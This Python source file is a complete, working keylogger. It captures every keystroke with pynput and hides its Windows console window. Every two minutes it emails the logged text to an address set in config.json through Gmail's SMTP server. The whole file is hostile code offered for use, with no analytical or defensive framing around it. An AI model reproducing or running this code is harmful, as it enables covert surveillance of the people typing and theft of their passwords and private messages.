import pynput.keyboard
import threading
import smtplib
import json
import ctypes
import sys

# Load credentials from config.json
def load_credentials():
    with open('config.json', 'r') as file:
        config = json.load(file)
    return config['email'], config['password']

email, password = load_credentials()

content = ""
caps_lock_on = False  # Flag to track Caps Lock state
email_interval = 120  # Email interval in seconds

# Mapping of numpad virtual key codes to their corresponding numbers
numpad_map = {
    96: "0",  # Numpad 0
    97: "1",  # Numpad 1
    98: "2",  # Numpad 2
    99: "3",  # Numpad 3
    100: "4",  # Numpad 4
    101: "5",  # Numpad 5
    102: "6",  # Numpad 6
    103: "7",  # Numpad 7
    104: "8",  # Numpad 8
    105: "9",  # Numpad 9
    110: ".",  # Numpad dot
}

def send_mail(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def notify_start():
    message = "Keylogger Started"
    send_mail(email, password, message)

def process_key_strike(key):
    global content, caps_lock_on

    # Handle Numpad keys
    if hasattr(key, 'vk') and key.vk in numpad_map:
        content += numpad_map[key.vk]
        return

    try:
        # Handle character keys
        if key.char is not None:  # Only process if the key has a char value
            char = key.char
            # Convert to uppercase if Caps Lock is on
            if caps_lock_on:
                char = char.upper() if char.isalpha() else char
            content += char
        else:
            raise AttributeError
    except AttributeError:
        # Handle special keys
        if key == pynput.keyboard.Key.space:
            content += " "
        elif key == pynput.keyboard.Key.caps_lock:
            # Toggle Caps Lock state
            caps_lock_on = not caps_lock_on
        elif key == pynput.keyboard.Key.enter:
            content += "\n"  # Handle the Enter key
        elif key == pynput.keyboard.Key.tab:
            content += "\t"  # Handle the Tab key
        else:
            content += f" [{key}] "  # Capture other special keys

def report():
    global content
    while True:
        if content:  # Send email only if content is not empty
            send_mail(email, password, content)
            content = ""
        threading.Event().wait(email_interval)

def hide_console():
    """Hide the console window."""
    if sys.platform == "win32":
        ctypes.windll.kernel32.SetConsoleTitleW("")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def main():
    # Hide the console window
    hide_console()
    
    # Notify that the keylogger has started
    notify_start()

    # Start the report thread
    email_thread = threading.Thread(target=report)
    email_thread.daemon = True  # Make sure it exits when the main thread does
    email_thread.start()

    # Set up the keylogger
    with pynput.keyboard.Listener(on_press=process_key_strike) as my_listener:
        my_listener.join()

if __name__ == "__main__":
    main()
